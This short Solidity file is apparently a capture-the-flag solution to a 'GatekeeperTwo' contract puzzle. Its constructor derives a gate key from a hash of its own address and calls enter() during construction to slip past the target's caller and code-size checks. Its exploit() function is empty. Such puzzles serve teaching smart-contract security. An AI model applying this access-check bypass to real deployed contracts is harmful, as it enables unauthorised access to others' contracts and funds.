pragma solidity ^0.8.24;

import "./gatekeepertwo.sol";

contract GatekeeperTwoPoc {
    GatekeeperTwo gatekeeperTwo;
    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        gatekeeperTwo.enter(bytes8(_gateKey));
    }

    function exploit(bytes8 _gateKey) public {
        
    }
}